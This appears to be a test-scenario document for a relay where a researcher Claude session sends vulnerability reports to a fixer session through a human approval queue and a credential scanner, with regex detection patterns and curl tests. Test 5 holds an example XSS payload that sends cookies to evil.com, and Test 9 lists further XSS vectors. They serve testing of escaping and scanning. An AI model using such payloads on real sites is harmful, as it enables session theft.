# Scenario 05: Security Audit Handoff

**Use case:** A security researcher Claude finds vulnerabilities, relays findings to a fixer Claude who patches them. The MCP approval queue prevents accidental credential leaks mid-relay.

**Participants:**
- **Researcher** (session creator) -- scans codebase, sends vulnerability reports
- **Fixer** (joins via invite) -- receives findings, sends back patches as `file_change` messages
- **Human operator** -- approves/rejects messages in the MCP approval queue before they hit the wire

---

## Technical Analysis

### What This Scenario Tests

Security audit handoff exercises the most sensitive data flow in the relay: vulnerability descriptions that may contain exploit code, API key patterns, file paths, and credential examples. This is the scenario where the approval queue and sensitive content scanner prove their value -- or fail catastrophically.

The core question: can two Claude sessions exchange security findings safely, without leaking real credentials into the relay's in-memory store or the dashboard UI?

### The Two-Layer Defense

**Layer 1: MCP Approval Queue (packages/mcp-server/src/approval/queue.ts)**

When a Claude session calls `relay_send`, the message does NOT go to the relay server. Instead:

1. `stageMessage()` creates a `PendingMessage` in an in-memory `Map<string, PendingMessage>`.
2. The scanner runs against `content`, `title`, and every `tag`.
3. Absolute paths in `references` and `content` are sanitized via `sanitizePaths()`.
4. The human sees a preview (via `generatePreview()`) that includes any warnings.
5. Only after `relay_approve` with `action="approve"` does the message actually POST to the relay server.

This means the human operator is the gatekeeper. If a researcher's finding contains a real AWS key embedded in an exploit example, the scanner flags it, the human sees the warning, and can reject the message or ask the researcher to redact.

**Layer 2: Sensitive Content Scanner (packages/mcp-server/src/approval/scanner.ts)**

The scanner checks content against 10 regex patterns defined in `constants.ts`:

| Pattern | Catches | Regex |
|---------|---------|-------|
| `sk-[a-zA-Z0-9]{20,}` | OpenAI/Anthropic API keys | Word boundary match |
| `ghp_[a-zA-Z0-9]{36,}` | GitHub Personal Access Tokens | Word boundary match |
| `AKIA[A-Z0-9]{16}` | AWS access key IDs | Word boundary match |
| `xox[bpsa]-[a-zA-Z0-9-]+` | Slack bot/user/app tokens | Word boundary match |
| `password\s*[:=]\s*["'][^"']+["']` | Password assignments (case-insensitive) | Key-value pattern |
| `secret\s*[:=]\s*["'][^"']+["']` | Secret assignments (case-insensitive) | Key-value pattern |
| `api[_-]?key\s*[:=]\s*["'][^"']+["']` | API key assignments (case-insensitive) | Key-value pattern |
| `/Users/[a-zA-Z0-9_-]+/` | macOS absolute paths | Path prefix |
| `/home/[a-zA-Z0-9_-]+/` | Linux home directory paths | Path prefix |
| `[A-Z]:\\` | Windows absolute paths | Drive letter pattern |

Additionally, the scanner detects base64 blobs longer than 1024 characters, which could contain binary secrets.

When a match is found, the warning redacts the value: first 6 chars + `...` + last 4 chars (or full value if under 10 chars). This prevents the warning itself from leaking the secret.

### Path Sanitization

`sanitizePaths()` automatically strips usernames from absolute paths:
- `/Users/weixiangzhang/projects/app.ts` becomes `projects/app.ts`
- `/home/deploy/.ssh/id_rsa` becomes `.ssh/id_rsa`

This runs on message content and file references before they enter the approval queue, so even approved messages never contain absolute paths with usernames.

### The Security Audit Risk

Security findings present a unique challenge: a vulnerability report *about* credential leaks will naturally contain patterns that look like credentials. For example:

- "Found hardcoded API key `api_key = 'AKIA1234567890ABCDEF'` in config.py" -- the scanner will flag this even though it is an example in a vulnerability report.
- "XSS payload: `<script>document.cookie</script>` in the auth form" -- the dashboard must escape this.
- "The `.env` file contains `SECRET_KEY='production-key-here'`" -- the scanner catches this via the `secret\s*[:=]` pattern.

The scanner does NOT distinguish between real credentials and examples. This is by design -- the human operator makes that call. The scanner flags, the human decides.

### Message Flow

```
Researcher Claude                    Human Operator                    Relay Server                    Fixer Claude
     |                                    |                                |                               |
     |-- relay_send (vuln finding) ------>|                                |                               |
     |   [staged in approval queue]       |                                |                               |
     |                                    |                                |                               |
     |   [scanner runs, flags warnings]   |                                |                               |
     |                                    |                                |                               |
     |<-- preview + warnings ------------|                                |                               |
     |                                    |                                |                               |
     |                              [human reviews]                        |                               |
     |                                    |                                |                               |
     |                                    |-- relay_approve (approve) ---->|                               |
     |                                    |   [POST /relay/:id]            |                               |
     |                                    |                                |-- SSE / poll --------------->|
     |                                    |                                |                               |
     |                                    |                                |<-- relay_send (patch) --------|
     |                                    |                                |   [staged in fixer's queue]   |
     |                                    |                                |                               |
     |                              [human reviews patch]                  |                               |
     |                                    |                                |                               |
     |                                    |-- relay_approve (approve) ---->|                               |
     |                                    |                                |                               |
     |<-- poll / SSE ----------------------------------------------------|                               |
```

### XSS Protection in Dashboard

The dashboard's `escapeHtml()` function replaces `&`, `<`, `>`, `"`, and `'` with HTML entities. This is applied to `sender_name` and `content` fields before insertion via `innerHTML`. This matters for security audit messages that may contain HTML/JS exploit payloads as examples.

### Rate Limiting

The relay server enforces a sliding-window rate limit of 600 requests per minute per token (as currently configured in `constants.ts`). The `rateLimitMiddleware` applies to all `/relay/:session_id` routes. When exceeded, the server returns HTTP 429 with a `retry_after_seconds` value.

---

## Test Cases

### Prerequisites

```bash
# Ensure the relay server is running
curl -s http://localhost:4190/health | jq .

# All tests use these variables (set after Test 1)
BASE="http://localhost:4190"
```

---

### Test 1: Create Session and Join as Researcher + Fixer

Create a security audit session. The creator acts as the researcher; a second participant joins as the fixer.

```bash
# Create the session (researcher is the creator)
CREATE_RESPONSE=$(curl -s -X POST "$BASE/sessions" \
  -H "Content-Type: application/json" \
  -d '{"name": "Security Audit: Auth Service", "ttl_minutes": 60}')

echo "$CREATE_RESPONSE" | jq .

SESSION_ID=$(echo "$CREATE_RESPONSE" | jq -r '.session_id')
RESEARCHER_TOKEN=$(echo "$CREATE_RESPONSE" | jq -r '.creator_token')
INVITE_TOKEN=$(echo "$CREATE_RESPONSE" | jq -r '.invite_token')

echo "Session:    $SESSION_ID"
echo "Researcher: $RESEARCHER_TOKEN"
echo "Invite:     $INVITE_TOKEN"

# Fixer joins the session
JOIN_RESPONSE=$(curl -s -X POST "$BASE/sessions/$SESSION_ID/join" \
  -H "Authorization: Bearer $INVITE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"participant_name": "fixer-claude"}')

echo "$JOIN_RESPONSE" | jq .

FIXER_TOKEN=$(echo "$JOIN_RESPONSE" | jq -r '.participant_token')
echo "Fixer:      $FIXER_TOKEN"

# Verify session has both participants
curl -s "$BASE/sessions/$SESSION_ID" \
  -H "Authorization: Bearer $RESEARCHER_TOKEN" | jq .
```

**Expected:** Session created with 201. Fixer joins successfully. Session info shows `["creator", "fixer-claude"]` in participants.

---

### Test 2: Researcher Sends Clean Vulnerability Finding (No Sensitive Content)

Send a finding that describes a vulnerability without including any credential patterns. This goes through the HTTP relay directly (simulating what happens after MCP approval).

```bash
# Clean finding -- describes XSS without embedding actual exploit payloads that trigger the scanner
curl -s -X POST "$BASE/relay/$SESSION_ID" \
  -H "Authorization: Bearer $RESEARCHER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "insight",
    "title": "VULN-001: Reflected XSS in Login Form",
    "content": "## Finding\n\nThe login form at /auth/login does not sanitize the `redirect` query parameter before reflecting it in the page HTML. An attacker can craft a URL that executes arbitrary JavaScript when a user clicks it.\n\n## Severity\n\nHigh -- session tokens are accessible via document.cookie (no HttpOnly flag).\n\n## Recommendation\n\nSanitize the redirect parameter using URL validation. Set HttpOnly on session cookies.",
    "tags": ["security", "xss", "auth", "high-severity"],
    "references": [
      {"file": "src/routes/auth/login.ts", "lines": "42-58", "note": "redirect param reflected without escaping"},
      {"file": "src/middleware/session.ts", "lines": "12", "note": "cookie set without HttpOnly"}
    ],
    "context": {"project": "auth-service", "branch": "main"}
  }' | jq .
```

**Expected:** HTTP 201 with `message_id`, `sequence: 0`, and `received_at` timestamp. No scanner involvement since this bypasses MCP and goes direct to the relay HTTP API.

---

### Test 3: Test Scanner Detection of API Key Patterns

This test exercises the MCP-side scanner directly. Since the scanner runs in the MCP process (not the HTTP server), we describe the MCP flow and also test that a message containing credential patterns can still be POSTed directly to the relay (the relay server itself does NOT run the scanner -- that is the MCP layer's job).

**MCP flow (what happens inside Claude Code):**

```
relay_send({
  session_id: "<SESSION_ID>",
  message_type: "insight",
  title: "VULN-002: Hardcoded AWS Key in Config",
  content: "Found hardcoded AWS credentials in config.py:\n\n```python\naws_access_key = 'AKIAIOSFODNN7EXAMPLE'\naws_secret_key = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'\n```\n\nThese are valid IAM credentials with S3 full access."
})
```

**What the scanner produces:** The `scanContent()` function matches:
- `AKIAIOSFODNN7EXAMPLE` via the `AKIA[A-Z0-9]{16}` pattern
- `aws_secret_key = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'` via the `secret\s*[:=]\s*["'][^"']+["']` pattern

The `generatePreview()` output would include:
```
WARNING:
  - Potential sensitive content detected: "AKIAI...MPLE"
  - Potential sensitive content detected: "aws_se...KEY'"
```

**Verify the relay server itself does NOT block these patterns** (it relies on MCP gating):

```bash
# The relay server accepts this -- it has no scanner. The MCP layer is the gate.
curl -s -X POST "$BASE/relay/$SESSION_ID" \
  -H "Authorization: Bearer $RESEARCHER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "insight",
    "title": "VULN-002: Hardcoded AWS Key in Config",
    "content": "Found AWS credentials:\n\n```\naws_access_key = '\''AKIAIOSFODNN7EXAMPLE'\''\naws_secret_key = '\''wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'\''\n```",
    "tags": ["security", "credentials", "aws"]
  }' | jq .
```

**Expected:** HTTP 201. The relay server does not have a scanner -- that responsibility belongs to the MCP `relay_send` tool. This test confirms the defense-in-depth model: MCP prevents sending, but the server itself is permissive. If a client bypasses MCP (e.g., raw curl), credentials can reach the relay. This is an accepted trade-off documented here.

---

### Test 4: MCP Approval Queue Lifecycle

This test describes the full MCP approval flow since the queue is in-process within the MCP server and cannot be driven via HTTP alone.

**Step 1: Stage a message**
```
relay_send({
  session_id: "<SESSION_ID>",
  message_type: "insight",
  title: "VULN-003: SQL Injection in Search",
  content: "The search endpoint passes user input directly to a SQL query...",
  tags: ["security", "sqli"]
})
```
Response includes `pending_id` and a preview. No warnings since the content is clean.

**Step 2: List pending messages**
```
relay_approve({ action: "list" })
```
Response shows 1 pending message with full preview.

**Step 3: Approve the message**
```
relay_approve({ pending_id: "<PENDING_ID>", action: "approve" })
```
The MCP server POSTs to `$BASE/relay/$SESSION_ID` with the researcher's stored token. Response confirms `message_id` and `sequence`.

**Step 4: Reject a message (alternative path)**
```
relay_approve({ pending_id: "<PENDING_ID>", action: "reject" })
```
Message is removed from the queue. It never reaches the relay server.

**Verification via HTTP** (after approval in step 3):

```bash
# Poll to confirm the approved message arrived
curl -s "$BASE/relay/$SESSION_ID?since=0&limit=50" \
  -H "Authorization: Bearer $FIXER_TOKEN" | jq '.messages[] | {sequence, type, title}'
```

**Expected:** The approved message appears in poll results. Rejected messages do not.

---

### Test 5: Researcher Sends Vulnerability Finding with Exploit Code

Send a finding that contains actual HTML/JS exploit code as part of the vulnerability description. This tests that the content is stored faithfully (the relay does not modify it) but the dashboard escapes it.

```bash
curl -s -X POST "$BASE/relay/$SESSION_ID" \
  -H "Authorization: Bearer $RESEARCHER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "insight",
    "title": "VULN-004: Stored XSS via Profile Bio",
    "content": "## Proof of Concept\n\nThe following payload, when entered as a user bio, executes in any viewer'\''s browser:\n\n```html\n<img src=x onerror=\"fetch('\''https://evil.com/steal?cookie='\''+document.cookie)\">\n```\n\n## Impact\n\nSession hijacking. The bio field renders in profile cards across the app with no sanitization.\n\n## Fix\n\nEscape HTML entities in bio output. Use DOMPurify or equivalent.",
    "tags": ["security", "xss", "stored", "critical"],
    "references": [
      {"file": "src/components/ProfileCard.tsx", "lines": "23-25", "note": "dangerouslySetInnerHTML on bio field"}
    ]
  }' | jq .
```

**Expected:** HTTP 201. The content is stored as-is (markdown with embedded HTML exploit). The relay server does not sanitize message content -- that is the dashboard's responsibility via `escapeHtml()`.

---

### Test 6: Fixer Polls and Receives All Findings

The fixer polls for messages to retrieve the researcher's findings.

```bash
# Poll all messages (since sequence 0)
POLL_RESPONSE=$(curl -s "$BASE/relay/$SESSION_ID?since=0&limit=50" \
  -H "Authorization: Bearer $FIXER_TOKEN")

echo "$POLL_RESPONSE" | jq '.messages | length'
echo "$POLL_RESPONSE" | jq '.messages[] | {sequence, type, title, sender_name}'

# Note the cursor for subsequent polls
echo "$POLL_RESPONSE" | jq '.next_cursor'
```

**Expected:** Returns all messages sent so far (from tests 2, 3, 5). Each message has `sender_name: "creator"` (since the researcher is the session creator). The `next_cursor` value can be used in subsequent `?since=` polls to get only new messages.

---

### Test 7: Fixer Sends Patch as file_change

The fixer sends a `file_change` message containing the patch for the XSS vulnerability.

```bash
curl -s -X POST "$BASE/relay/$SESSION_ID" \
  -H "Authorization: Bearer $FIXER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "file_change",
    "title": "FIX-001: Sanitize redirect param in login",
    "content": "```diff\n--- a/src/routes/auth/login.ts\n+++ b/src/routes/auth/login.ts\n@@ -42,7 +42,12 @@\n-  const redirect = req.query.redirect || \"/dashboard\";\n-  res.send(`<a href=\"${redirect}\">Continue</a>`);\n+  const redirect = req.query.redirect || \"/dashboard\";\n+  // Validate redirect is a relative path (no protocol, no //)\n+  const safeRedirect = /^\\/((?!\\/).)*$/.test(redirect) ? redirect : \"/dashboard\";\n+  const escaped = safeRedirect\n+    .replace(/&/g, \"&amp;\")\n+    .replace(/</g, \"&lt;\")\n+    .replace(/>/g, \"&gt;\")\n+    .replace(/\"/g, \"&quot;\");\n+  res.send(`<a href=\"${escaped}\">Continue</a>`);\n```\n\nAlso set HttpOnly on session cookie:\n\n```diff\n--- a/src/middleware/session.ts\n+++ b/src/middleware/session.ts\n@@ -12,1 +12,1 @@\n-  res.cookie(\"session\", token, { secure: true });\n+  res.cookie(\"session\", token, { secure: true, httpOnly: true, sameSite: \"strict\" });\n```",
    "tags": ["fix", "xss", "auth"],
    "references": [
      {"file": "src/routes/auth/login.ts", "lines": "42-53", "note": "redirect sanitization"},
      {"file": "src/middleware/session.ts", "lines": "12", "note": "HttpOnly cookie flag"}
    ]
  }' | jq .
```

**Expected:** HTTP 201. The `file_change` type is accepted. The diff content is stored verbatim. The researcher can poll to receive this patch.

---

### Test 8: Rate Limit Enforcement

Send rapid requests to verify the rate limiter fires. The current limit is 600 req/min (from `constants.ts`). We test by sending a burst and checking headers.

```bash
# Rapid-fire 20 requests to confirm they succeed (well under 600/min limit)
for i in $(seq 1 20); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "$BASE/relay/$SESSION_ID?since=0&limit=1" \
    -H "Authorization: Bearer $FIXER_TOKEN")
  echo "Request $i: HTTP $STATUS"
done

# To actually trigger the 429, you would need 600+ requests in under 60 seconds.
# This is a stress test -- uncomment to run (takes ~10-15 seconds with curl overhead):
#
# echo "--- Stress test: sending 610 requests ---"
# PASS=0; FAIL=0
# for i in $(seq 1 610); do
#   STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
#     "$BASE/relay/$SESSION_ID?since=0&limit=1" \
#     -H "Authorization: Bearer $FIXER_TOKEN")
#   if [ "$STATUS" = "429" ]; then
#     FAIL=$((FAIL + 1))
#     if [ "$FAIL" = "1" ]; then
#       echo "First 429 at request $i"
#       curl -s "$BASE/relay/$SESSION_ID?since=0&limit=1" \
#         -H "Authorization: Bearer $FIXER_TOKEN" | jq .
#     fi
#   else
#     PASS=$((PASS + 1))
#   fi
# done
# echo "Passed: $PASS, Rate-limited: $FAIL"
```

**Expected:** The first 20 requests all return HTTP 200. The commented stress test would show HTTP 429 responses starting around request 601, with a JSON body containing `error: "Rate limit exceeded"` and `retry_after_seconds`.

---

### Test 9: XSS Escaping in Message Content

Verify that message content containing HTML/JS payloads is stored as-is by the server (the server is a data store, not a renderer) but that the content would be escaped by the dashboard's `escapeHtml()` function.

```bash
# Send a message with an XSS payload in the content
curl -s -X POST "$BASE/relay/$SESSION_ID" \
  -H "Authorization: Bearer $RESEARCHER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "insight",
    "title": "<script>alert(1)</script>",
    "content": "Test XSS vectors:\n\n1. `<script>alert(document.cookie)</script>`\n2. `<img src=x onerror=alert(1)>`\n3. `<svg onload=alert(1)>`\n\nThese should be escaped in the dashboard.",
    "tags": ["xss-test"]
  }' | jq .

# Poll the message back and verify the raw content is preserved (not escaped at storage layer)
LAST=$(curl -s "$BASE/relay/$SESSION_ID?since=0&limit=50" \
  -H "Authorization: Bearer $RESEARCHER_TOKEN")

# The server returns raw content -- escaping is the dashboard's job
echo "$LAST" | jq '.messages[-1].title'
echo "$LAST" | jq '.messages[-1].content'
```

**Expected:** The server stores and returns the content with `<script>` tags intact. The title field contains `<script>alert(1)</script>` as a raw string. The dashboard's `escapeHtml()` function (in `app.js`) converts `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, and `'` to `&#039;` before inserting into `innerHTML`. This prevents execution.

**Dashboard escaping function (for reference):**
```javascript
function escapeHtml(str) {
  return (str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

---

## Security Model Summary

| Layer | Location | What It Does | Bypass Risk |
|-------|----------|-------------|-------------|
| Scanner | MCP process (`scanner.ts`) | Flags sensitive patterns, sanitizes paths | Bypassed by direct HTTP (curl, dashboard) |
| Approval Queue | MCP process (`queue.ts`) | Human gate before relay transmission | Bypassed by direct HTTP |
| Auth Middleware | Relay server (`auth.ts`) | Bearer token validation per session | Tokens are UUIDs -- no expiry beyond session TTL |
| Rate Limiter | Relay server (`rate-limit.ts`) | 600 req/min sliding window per token | IP fallback for unauthenticated requests |
| XSS Escaping | Dashboard (`app.js`) | `escapeHtml()` on sender_name and content | Only protects the web dashboard, not API consumers |
| CORS | Relay server (`index.ts`) | Restricts browser origins | Does not affect non-browser clients |
| Zod Validation | Relay server + MCP | Schema enforcement on all payloads | Cannot be bypassed -- runs server-side |

**Key architectural insight:** The scanner and approval queue are MCP-side defenses. They protect the Claude-to-Claude workflow but do NOT protect the relay server from direct HTTP access. A human with curl and a valid token can send arbitrary content to the relay. This is intentional -- the relay is a dumb pipe. Intelligence lives in the MCP layer.

**Implication for security audits:** If the relay is exposed beyond localhost (e.g., via ngrok), the scanner/queue protections are only as strong as the client using them. Direct HTTP clients skip the scanner entirely.
